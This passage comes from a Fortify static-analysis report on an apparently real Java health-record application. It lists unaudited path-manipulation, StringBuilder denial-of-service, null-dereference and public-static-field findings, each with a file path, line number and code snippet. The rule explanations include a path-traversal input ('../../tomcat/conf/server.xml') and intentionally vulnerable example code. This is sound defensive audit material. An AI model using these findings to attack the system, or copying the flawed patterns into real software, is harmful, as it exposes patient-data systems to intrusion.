 {profilesid:"&lt;%=l_ObjProfileFormBean.getProfilesid()%&gt;",profilename:"&lt;%=l_ObjProfileFormBean.getProfilename()%&gt;",status:"&lt;%=l_ObjProfileFormBean.getStatus()%&gt;"},
 &lt;%}%&gt;];
 if(mydata.length &gt; 0) {</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPProfileDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPProfileDAOImpl.java</FilePath>
<LineStart>106</LineStart>
<Snippet>		}else{
			
			List l_lstProfile = ldapTemplate.search(new DistinguishedName("cn=PROFILES"), andfilter.encode(), getContextMapper());
			
			for(int i=0;i&lt;l_lstProfile.size();i++){</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="97">
                        <groupTitle>Path Manipulation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Attackers can control the file system path argument to File() at SerializationHelper.java line 123, which allows them to access or modify otherwise protected files.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Path manipulation errors occur when the following two conditions are met:

1. An attacker can specify a path used in an operation on the file system.

2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.

For example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.


Example 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files.


String rName = request.getParameter("reportName");
File rFile = new File("/usr/local/apfr/reports/" + rName);
...
rFile.delete();


Example 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.


fis = new FileInputStream(cfg.getProperty("sub")+".txt");
amt = fis.read(arr);
out.println(arr);


Some think that in the mobile environment, classic vulnerabilities, such as path manipulation, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.

Example 3: The following code adapts Example 1 to the Android platform.


...
        String rName = this.getIntent().getExtras().getString("reportName");
        File rFile = getBaseContext().getFileStreamPath(rName);
...
        rFile.delete();
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.

In some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to blacklisting in these situations. Blacklisting selectively rejects or escapes potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a whitelist of characters that are allowed to appear in the resource name and accept input composed exclusively of characters in the approved set.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. If the program is performing custom input validation you are satisfied with, use the Fortify Custom Rules Editor to create a cleanse rule for the validation routine.

2. Implementation of an effective blacklist is notoriously difficult. One should be skeptical if validation logic requires blacklisting. Consider different types of input encoding and different sets of metacharacters that might have special meaning when interpreted by different operating systems, databases, or other resources. Determine whether or not the blacklist can be updated easily, correctly, and completely if these requirements ever change.

3. A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>97</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="4BCD80D26306C5EC7F450DD5BEA8C406" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers can control the file system path argument to File() at FileUtil.java line 170, which allows them to access or modify otherwise protected files.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>170</LineStart>
<Snippet>        try
        {
            File l_objFile = new File(p_sFileName);
            l_objBufStream = new BufferedInputStream(new FileInputStream(l_objFile));
</Snippet>
<TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>250</LineStart>
<Snippet>        {
            l_sGridName = p_reqRequest.getParameter(GRID_NAME);
            l_enmParameterNames = p_reqRequest.getParameterNames();
            boolean isFld=false;
            l_sPageName=p_reqRequest.getParameter("fhdn&amp;PageName");</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1865822B3B983E31CC275E7CD1F564E2" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers can control the file system path argument to File() at SerializationHelper.java line 123, which allows them to access or modify otherwise protected files.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SerializationHelper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/SerializationHelper.java</FilePath>
<LineStart>123</LineStart>
<Snippet>    {

        File l_objFile = new File(p_sFileName);
        FileInputStream l_objFileInputStream = new FileInputStream(l_objFile);
</Snippet>
<TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>URLRedirector.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/URLRedirector.java</FilePath>
<LineStart>53</LineStart>
<Snippet>
            // Retrieve the Tickler Id.
            String l_sTicklerId = p_objRequest.getParameter("nfld&amp;TicklerId" );

            // Get the Map for the tickler id.</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B7D115BE1BB3F231308A57C4D0322F9F" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers can control the file system path argument to File() at FileUtil.java line 170, which allows them to access or modify otherwise protected files.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>170</LineStart>
<Snippet>        try
        {
            File l_objFile = new File(p_sFileName);
            l_objBufStream = new BufferedInputStream(new FileInputStream(l_objFile));
</Snippet>
<TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SerializationHelper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/SerializationHelper.java</FilePath>
<LineStart>131</LineStart>
<Snippet>
        byte [] l_objFileData = new byte [l_iFileSize];
        l_objBufferedInputStream.read(l_objFileData);
        l_objFileInputStream.close();
        l_objBufferedInputStream.close();</Snippet>
<TargetFunction>java.io.FilterInputStream.read()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A14221E4356EDA2FD8159E1158E4122C" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers can control the file system path argument to File() at FileUtil.java line 170, which allows them to access or modify otherwise protected files.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>170</LineStart>
<Snippet>        try
        {
            File l_objFile = new File(p_sFileName);
            l_objBufStream = new BufferedInputStream(new FileInputStream(l_objFile));
</Snippet>
<TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>838</LineStart>
<Snippet>        {
            //since it is a range operator, get the values from request as string array.
            l_objRetFilterValue = p_reqRequest.getParameterValues(p_sFilter);
            List l_lstList = CollectionUtil.convertStringArrayToList((String[]) l_objRetFilterValue);
            /*if(l_lstList.size() &lt; 2)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="061117C6C9CB586BD80B822D750C5110" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Attackers can control the file system path argument to File() at FileUtil.java line 170, which allows them to access or modify otherwise protected files.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>170</LineStart>
<Snippet>        try
        {
            File l_objFile = new File(p_sFileName);
            l_objBufStream = new BufferedInputStream(new FileInputStream(l_objFile));
</Snippet>
<TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>335</LineStart>
<Snippet>                        if(multipleChoice)
                        {
                            b_objString = (String[])p_reqRequest.getParameterValues(l_sElementName);
                            if(b_objString==null)b_objString = (String[])p_reqRequest.getParameterValues(l_sOrgElementName);
                            </Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="94">
                        <groupTitle>Denial of Service: StringBuilder</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The call to append() in LogFormatter.java on line 45 appends untrusted data to a StringBuilder instance initialized with the default backing-array size (16). This can cause the JVM to over-consume heap memory space.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Appending user-controlled data to a StringBuilder instance initialized with the default backing character array size (16) can cause the application to consume large amounts of heap memory while resizing the underlying array to fit user's data. Everytime new data is appended to a StringBuilder instance, it will try to fit it on its backing character array. If data does not fit, a new array will be created doubling the previous size while the old array will remain in the heap until it is garbage collected. This defect can be used to execute a Denial of Service (DoS) attack.

Example 1: User-controlled data is appended to a StringBuilder instance initialized with the default constructor.

    ...
    StringBuilder sb = new StringBuilder();
    sb.append(request.getParameter("foo"));
    ...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Initialize the StringBuilder with a size similar to the length of the expected data in order to reduce the number of times the backing array needs to be resized. Check the size of the data before appending it to a StringBuilder instance.

Example 2: User-controlled data is appended to a StringBuilder instance initialized with the default constructor.

    ...
    private final int MAX_DATA = 128;
    private final int EXPECTED_BUFFER_DATA = 1024;
    StringBuilder sb = new StringBuilder(EXPECTED_BUFFER_DATA);
    ...
    String data = request.getParameter("foo");
    if (data.length() &lt; MAX_DATA) sb.append(data);
    ...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. The recommended fix for this weakness might not be detectable, and therefore you might need to perform additional auditing after remediation to confirm the fix. After you confirm the weakness is removed, you can safely suppress the issue.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>94</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A6DCB5AB41F2C2A805ADACF667D268BD" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to append() in LogFormatter.java on line 45 appends untrusted data to a StringBuilder instance initialized with the default backing-array size (16). This can cause the JVM to over-consume heap memory space.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LogFormatter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/log/LogFormatter.java</FilePath>
<LineStart>45</LineStart>
<Snippet>      sbBuffer.append(p_sMethodName);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUid);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUserMsg);</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>250</LineStart>
<Snippet>        {
            l_sGridName = p_reqRequest.getParameter(GRID_NAME);
            l_enmParameterNames = p_reqRequest.getParameterNames();
            boolean isFld=false;
            l_sPageName=p_reqRequest.getParameter("fhdn&amp;PageName");</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FAF49429695AAB796983EBB76A70C29D" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to append() in LogFormatter.java on line 45 appends untrusted data to a StringBuilder instance initialized with the default backing-array size (16). This can cause the JVM to over-consume heap memory space.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LogFormatter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/log/LogFormatter.java</FilePath>
<LineStart>45</LineStart>
<Snippet>      sbBuffer.append(p_sMethodName);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUid);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUserMsg);</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EHRRequestHandler.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/action/EHRRequestHandler.java</FilePath>
<LineStart>51</LineStart>
<Snippet>    	try {
    		String m_sUserLoginID = p_objRequest.getParameter("fhdn&amp;UserId");
    		String m_sUserDomainID = p_objRequest.getParameter("fhdn&amp;DomainName");
    		String m_sUserProfileId = p_objRequest.getParameter("fhdn&amp;ProfileId");
    		String m_sUserProfileName = p_objRequest.getParameter("fhdn&amp;ProfileName");</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CE0385CD6A71C70D3467EA1F3A2D1C48" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to append() in LogFormatter.java on line 45 appends untrusted data to a StringBuilder instance initialized with the default backing-array size (16). This can cause the JVM to over-consume heap memory space.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LogFormatter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/log/LogFormatter.java</FilePath>
<LineStart>45</LineStart>
<Snippet>      sbBuffer.append(p_sMethodName);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUid);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUserMsg);</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>249</LineStart>
<Snippet>        try
        {
            l_sGridName = p_reqRequest.getParameter(GRID_NAME);
            l_enmParameterNames = p_reqRequest.getParameterNames();
            boolean isFld=false;</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="06EDC3927D6ABC5985E2FAD203BFAFDB" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to append() in LogFormatter.java on line 45 appends untrusted data to a StringBuilder instance initialized with the default backing-array size (16). This can cause the JVM to over-consume heap memory space.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LogFormatter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/log/LogFormatter.java</FilePath>
<LineStart>45</LineStart>
<Snippet>      sbBuffer.append(p_sMethodName);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUid);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUserMsg);</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SSOLoginRequestHandler.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/action/SSOLoginRequestHandler.java</FilePath>
<LineStart>332</LineStart>
<Snippet>		if (l_sTemp == null) {
			l_SSOUserDetails.setSSOID(((String) p_objRequest
					.getParameter(ECAMSSecurityConstants.REQ_PARAM_SSO_ID))
					.toLowerCase());
		} else {</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="21345053F4E0025208724AB695B70C42" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to append() in LogFormatter.java on line 45 appends untrusted data to a StringBuilder instance initialized with the default backing-array size (16). This can cause the JVM to over-consume heap memory space.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LogFormatter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/log/LogFormatter.java</FilePath>
<LineStart>45</LineStart>
<Snippet>      sbBuffer.append(p_sMethodName);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUid);
      sbBuffer.append(DELIMETER);
      sbBuffer.append(p_sUserMsg);</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EHRRequestHandler.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/action/EHRRequestHandler.java</FilePath>
<LineStart>50</LineStart>
<Snippet>    	
    	try {
    		String m_sUserLoginID = p_objRequest.getParameter("fhdn&amp;UserId");
    		String m_sUserDomainID = p_objRequest.getParameter("fhdn&amp;DomainName");
    		String m_sUserProfileId = p_objRequest.getParameter("fhdn&amp;ProfileId");</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="81">
                        <groupTitle>Redundant Null Check</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method getDataFields() in CNSIEditorBean.java can crash the program by dereferencing a null-pointer on line 155.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Null-pointer exceptions usually occur when one or more of the programmer's assumptions is violated. A check-after-dereference error occurs when a program dereferences an object that can be null before checking if the object is null.

Most null-pointer issues result in general software reliability problems, but if attackers can intentionally trigger a null-pointer dereference, they can use the resulting exception to bypass security logic or to cause the application to reveal debugging information that will be valuable in planning subsequent attacks.

Example: In the following code, the programmer assumes that the variable foo is not null and confirms this assumption by dereferencing the object. However, the programmer later contradicts the assumption by checking foo against null. If foo can be null when it is checked in the if statement then it can also be null when it is dereferenced and might cause a null-pointer exception. Either the dereference is unsafe or the subsequent check is unnecessary.


foo.setBar(val);
...
if (foo != null) {
	...
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Implement careful checks before dereferencing objects that might be null. When possible, abstract null checks into wrappers around code that manipulates resources to ensure that they are applied in all cases and to minimize the places where mistakes can occur.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>81</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="C20A49525475B19AFF377A0AA831DBB5" ruleID="771E5717-2B4D-64FC-9A63-E16701E24D0D">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getInsertString() in DbUtilImpl.java can crash the program by dereferencing a null-pointer on line 730.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>730</LineStart>
<Snippet>        if (p_bIsSequenceAsPreparedArgument)
        {
            b_sTmpColumnStr.append(p_sSequenceColumn.toUpperCase()).append(',');
            b_sTmpValueStr.append('?').append(',');
        }</Snippet>
<TargetFunction>Dereferenced : p_sSequenceColumn()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1CA41AEFAEA1B49BD2625A00384A405B" ruleID="03840C20-F22B-B900-B76E-63258B717C77">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getDataFields() in CNSIEditorBean.java can crash the program by dereferencing a null-pointer on line 155.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>155</LineStart>
<Snippet>
				if (!m_TempMap.contains(l_sParam)
						&amp;&amp; !m_TableList.contains(dataField)) {
					m_ListFields.add(dataField);
				}</Snippet>
<TargetFunction>Dereferenced : m_TableList()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C20A49525475B19AFF377A0AA831DBB6" ruleID="771E5717-2B4D-64FC-9A63-E16701E24D0D">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getInsertString() in DbUtilImpl.java can crash the program by dereferencing a null-pointer on line 737.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>737</LineStart>
<Snippet>            if (b_bIsSequenceRequired)
            {
                b_sTmpColumnStr.append(p_sSequenceColumn.toUpperCase()).append(',');

                if (p_bIsSequenceIncrementRequired)</Snippet>
<TargetFunction>Dereferenced : p_sSequenceColumn()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="46976E47E5B9884DDF0898FCFCF2EACF" ruleID="03840C20-F22B-B900-B76E-63258B717C77">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method setPageContext() in ContextHelper.java can crash the program by dereferencing a null-pointer on line 255.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ContextHelper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/context/ContextHelper.java</FilePath>
<LineStart>255</LineStart>
<Snippet>																					CommonConstants.APPLICATION_CONTEXT);
//		l_objGenericContext.generateContext().clear();
		Map l_mapAllAnchorPoints = new CNSIMap(l_objGenericContext.generateAppContext());
		Map l_mapAnchorPoints = new CNSIMap(l_lstModuleContext.size());
		if(l_objGenericContext == null)</Snippet>
<TargetFunction>Dereferenced : l_objGenericContext()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C20A49525475B19AFF377A0AA831DBB4" ruleID="771E5717-2B4D-64FC-9A63-E16701E24D0D">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getInsertString() in DbUtilImpl.java can crash the program by dereferencing a null-pointer on line 657.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>657</LineStart>
<Snippet>
            // if the column name is that of primary key column, skip if sequence is to be used.
            if (b_bIsSequenceRequired &amp;&amp; p_sSequenceColumn.equalsIgnoreCase(l_sTemp))
            {
                continue;</Snippet>
<TargetFunction>Dereferenced : p_sSequenceColumn()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="62">
                        <groupTitle>Poor Style: Non-final Public Static Field</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Non-final public static fields can be changed by external classes.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Typically, you do not want to provide external classes direct access to your object's member fields since a public field can be changed by any external class. Good object oriented designed uses encapsulation to prevent implementation details, such as member fields, from being exposed to other classes. Further, if the system assumes that this field cannot be changed, then malicious code might be able to adversely change the behavior of the system.

Example 1: In the following code, the field ERROR_CODE is declared as public and static, but not final:


public class MyClass
{
public static int ERROR_CODE = 100;
//...
}

In this case, malicious code might be able to change this error code and cause the program to behave in an unexpected manner.
This category is from the Cigital Java Rulepack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>If you intend to expose a field as a constant value, the field should be declared as public static final, otherwise declare the field private.

Example 2:

public class MyClass
{
public static final int ERROR_CODE = 123;
//...
}</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>62</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="35CEE1C00CC207F4C4F071E5E3C3950C" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Non-final public static fields can be changed by external classes.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>33</LineStart>
<Snippet>
    /** String that holds type for External link app area *. */
    public static String VALUE_APP_AREA_EXTERNAL_LINK_TYPE="E";
    
    /** Map to hold the Tab App Area details with App area name as key. */</Snippet>
<TargetFunction>Field: VALUE_APP_AREA_EXTERNAL_LINK_TYPE()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6F285C3BCB49DE8DE81BE665CB492458" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Non-final public static fields can be changed by external classes.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CacheManagerRepositoryImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/CacheManagerRepositoryImpl.java</FilePath>
<LineStart>33</LineStart>
<Snippet>	/** For single ton design , hold the current instance.
   */
 public static CacheManagerRepositoryImpl m_objCacheManagerRepositoryImpl=null;
 
 /** Map to maintain the cachemanagers with this identity.</Snippet>
<TargetFunction>Field: m_objCacheManagerRepositoryImpl()</TargetFunction>
                            </Primary>
                        </Issue>
